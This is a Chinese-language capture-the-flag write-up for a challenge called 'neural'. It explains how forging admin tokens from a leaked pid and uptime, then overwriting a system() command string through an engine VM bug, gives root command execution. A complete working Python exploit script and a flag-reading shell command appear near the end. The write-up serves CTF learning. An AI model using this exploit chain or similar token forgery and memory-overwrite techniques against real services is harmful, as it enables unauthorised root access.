# neural

## 连接信息

题目给的是：

```text
nc 8.147.132.32 21053
```

但实际连上后跑的是一个 HTTP 服务，首页为：

```text
http://8.147.132.32:21053/
```

## 最终结果

```text
flag{cc4efa1d-1fd8-4820-8690-80547a42a455}
```

## 程序结构

这题是一个 Flask 前端加 C 后端的组合。

- Flask 前端：`frontend/app.py`
- C 后端：`bin/engine`
- 前端通过 Unix socket `/opt/neuralchat/run/engine.sock` 和后端通信
- 后端 `engine` 以 `root` 身份启动
- Flask 以低权限用户 `neuralchat` 运行

`init.sh` 里有一句很关键：

```bash
# Engine runs as root, Flask runs as neuralchat (privilege separation)
```

同时还暴露了一个非常危险的接口：

```python
@app.route('/api/raw', methods=['POST'])
```

这个接口允许我们直接把一段 base64 编码的原始协议包转发给后端，不受正常前端功能限制。

## 漏洞一：管理员认证可预测

### 1. `/api/status` 泄露关键运行信息

访问：

```text
GET /api/status
```

返回：

```json
{"model_loaded":1,"pid":8,"sessions":0,"status":"running","uptime":435,"version":"2.1.0"}
```

这里直接泄露了：

- `pid`
- `uptime`

同时 HTTP 响应头里还有服务端时间：

```text
Date: Thu, 26 Mar 2026 03:11:37 GMT
```

因此可以还原：

```text
start_time = server_now - uptime
```

### 2. admin key 只依赖 `pid` 和 `start_time`

在 `main` 里，程序启动时会调用：

```c
derive_admin_key(g_pid, g_start_time, g_pwn);
```

也就是说管理员密钥是由：

- `pid`
- `start_time`

推出来的，而且结果直接写在全局区 `g_pwn` 前 16 字节里。

### 3. admin token 校验逻辑很弱

`verify_admin_token` 的逻辑是：

1. 检查 `abs(time(NULL) - ts) <= 60`
2. 计算：

```text
SHA256(timestamp_le || subcmd || data || admin_key)
```

3. 与请求里给的 32 字节 token 做 `memcmp`

因为：

- `timestamp` 由我们控制
- `subcmd` 和 `data` 由我们控制
- `admin_key` 可由 `pid + start_time` 复现

所以管理员认证可以直接伪造。

### 4. admin 包格式

通过 `handle_admin` 可以还原出 payload 格式：

```text
[timestamp:4][subcmd:1][token:32][data...]
```

外层再套一层 engine 原始协议，命令字为：

```text
0xFF
```

前端 `/api/raw` 会替我们把这段原始数据发给后端。

### 5. 验证管理员权限

枚举 admin 子命令后可以得到：

- `subcmd = 1`：返回 admin info
- `subcmd = 2`：reload model
- `subcmd = 3`：update system prompt
- `subcmd = 4`：读取日志尾部
- `subcmd = 5`：执行 diagnostics

伪造出合法 token 后，发送 `subcmd = 1`，远端回显：

```json
{"admin":true,"pid":8,"start_time":1774494262,"uptime":435,"sessions":0,"model":"neuralchat-7b","version":"2.1.0","log_file":"/opt/neuralchat/logs/engine.log"}
```

说明管理员认证已经完全绕过。

## 漏洞二：diagnostics 可借 VNM 改写 `system()` 的命令字符串

`handle_admin` 的 `subcmd = 5` 逻辑是：

```c
execute_vnm(data, len);
system(g_pwn + 0x10);
```

程序初始化时，`g_pwn + 0x10` 放的是这段字符串：

```text
/opt/neuralchat/plugins/diag.sh
```

也就是说 diagnostics 本质上会执行：

```c
system("/opt/neuralchat/plugins/diag.sh");
```

如果能改掉 `g_pwn + 0x10`，就可以让 root 执行任意命令。

### 1. `execute_vnm` 是一个小型虚拟机

相关 opcode 里，最有用的是：

- `0x02 reg imm32`：给寄存器赋一个 32 位立即数
- `0x07 off reg`：把寄存器的 4 字节内容写到 `g_pwn + 0x90 + off`
- `0xFF`：结束

其中 `off` 是一个有符号字节。

### 2. 可以从 `g_pwn+0x90` 往前写

`0x07` 的目标地址不是固定往后，而是：

```text
g_pwn + 0x90 + signed(off)
```

因此只要令：

```text
off = -0x80
```

就会写到：

```text
g_pwn + 0x90 - 0x80 = g_pwn + 0x10
```

这正好覆盖 diagnostics 默认执行的路径字符串。

### 3. 直接把路径改成 shell 命令

把原来的：

```text
/opt/neuralchat/plugins/diag.sh
```

改成：

```text
cat /home/ctf/flag >/opt/neuralchat/downloads/flag
```

然后再触发一次 `subcmd = 5`，后端实际执行的就会是：

```sh
system("cat /home/ctf/flag >/opt/neuralchat/downloads/flag")
```

由于 `engine` 以 root 身份运行，所以可以读取 `/home/ctf/flag`。

## 读取 flag

前端本身就提供下载接口：

```text
GET /api/download?file=flag
```

因此完整利用流程就是：

1. 用 `/api/status` 泄露 `pid` 和 `uptime`
2. 用响应头 `Date` 还原 `start_time`
3. 复现 `derive_admin_key`
4. 伪造 admin token
5. 调用 `subcmd = 5`
6. 用 VNM 把 `g_pwn + 0x10` 改成 `cat /home/ctf/flag >/opt/neuralchat/downloads/flag`
7. 再访问 `/api/download?file=flag`

最终拿到：

```text
flag{cc4efa1d-1fd8-4820-8690-80547a42a455}
```

## exp

下面这份脚本是我最后打远端用的版本，不依赖第三方库。

```python
import base64
import email.utils
import hashlib
import json
import struct
import urllib.request


HOST = "http://8.147.132.32:21053"

SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76"
    "ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d83115"
    "04c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f84"
    "53d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa8"
    "51a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d1973"
    "60814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479"
    "e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a"
    "703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df"
    "8ca1890dbfe6426841992d0fb054bb16"
)


def derive_admin_key(pid, start_time):
    x = ((pid * 0x45D9F3B) & 0xFFFFFFFF) ^ (((start_time & 0xFFFFFFFF) * 0x119DE1F3) & 0xFFFFFFFF)
    out = bytearray(16)
    for i in range(16):
        x ^= (x << 13) & 0xFFFFFFFF
        x &= 0xFFFFFFFF
        x ^= (x >> 7)
        x &= 0xFFFFFFFF
        x ^= (x << 17) & 0xFFFFFFFF
        x &= 0xFFFFFFFF
        out[i] = SBOX[x & 0xFF]
        x = (x + (((i + 1) * 0x9E3779B9) & 0xFFFFFFFF)) & 0xFFFFFFFF
    return bytes(out)


def http_get(path):
    req = urllib.request.Request(HOST + path)
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.read(), r.headers


def http_post_json(path, obj):
    req = urllib.request.Request(
        HOST + path,
        data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode()), r.headers


def call_raw(command, payload=b""):
    resp, _ = http_post_json(
        "/api/raw",
        {"data": base64.b64encode(bytes([command]) + payload).decode()},
    )
    out = base64.b64decode(resp["data"])
    return out[0], out[1:]


def admin_call(subcmd, data, ts, admin_key):
    token = hashlib.sha256(struct.pack("<I", ts) + bytes([subcmd]) + data + admin_key).digest()
    payload = struct.pack("<I", ts) + bytes([subcmd]) + token + data
    return call_raw(0xFF, payload)


def build_vnm_write_command(cmd):
    """
    用 VNM 把 g_pwn + 0x10 覆盖成我们想执行的 shell 命令。
    由于 store 的目标是 g_pwn + 0x90 + signed(off)，
    所以 off = -0x80 时刚好写到 g_pwn + 0x10。
    """
    cmd = cmd + b"\x00"
    prog = bytearray()
    for i in range(0, len(cmd), 4):
        chunk = cmd[i:i + 4].ljust(4, b"\x00")
        off = -0x80 + i
        prog += bytes([0x02, 0x00]) + chunk      # movi r0, imm32
        prog += bytes([0x07, off & 0xFF, 0x00])  # store [g_pwn+0x90+off], r0
    prog += b"\xFF"
    return bytes(prog)


status_raw, headers = http_get("/api/status")
status = json.loads(status_raw.decode())

server_now = int(email.utils.parsedate_to_datetime(headers["Date"]).timestamp())
start_time = server_now - status["uptime"]
admin_key = derive_admin_key(status["pid"], start_time)

print("[*] status =", status)
print("[*] server_now =", server_now)
print("[*] start_time =", start_time)

# 先验证管理员认证
st, body = admin_call(1, b"", server_now, admin_key)
print("[*] admin info =", st, body.decode(errors="replace"))

# 用 diagnostics 执行一条 root 命令，把 flag 写到下载目录
shell_cmd = b"cat /home/ctf/flag >/opt/neuralchat/downloads/flag"
vnm = build_vnm_write_command(shell_cmd)
st, body = admin_call(5, vnm, server_now, admin_key)
print("[*] diagnostics =", st, body.decode(errors="replace"))

# 下载 flag
flag_raw, _ = http_get("/api/download?file=flag")
print(flag_raw.decode(errors="replace"))
```

## 远端结果

脚本执行后输出：

```text
flag{cc4efa1d-1fd8-4820-8690-80547a42a455}
```

## 利用链总结

1. `/api/status` 泄露 `pid` 和 `uptime`
2. `Date` 响应头补齐当前服务端时间
3. 由 `pid + start_time` 复现 admin key
4. 伪造 admin token
5. 调用 admin diagnostics
6. 用 VNM 把 `system()` 执行的路径字符串改成自定义 shell 命令
7. 把 `/home/ctf/flag` 写到 `/opt/neuralchat/downloads/flag`
8. 通过下载接口取回 flag
